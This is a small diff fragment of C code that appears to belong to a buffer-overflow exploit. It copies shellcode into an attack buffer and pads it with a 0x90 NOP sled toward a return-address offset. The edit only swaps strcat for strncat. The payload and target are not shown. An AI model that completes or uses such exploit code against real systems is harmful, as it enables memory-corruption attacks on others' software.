@@ -18,7 +18,7 @@ main ( int argc, char * argv[] )
 	char *	env[1];
 	unsigned char attack_buffer[BUF_SIZE];
 
-	strcat(attack_buffer, shellcode, SHELL_SIZE);
+	strncat(attack_buffer, shellcode, SHELL_SIZE);
 	for (int i = SHELL_SIZE; i < BUF_TO_RET; i++)
 		attack_buffer[i] = 0x90;
 
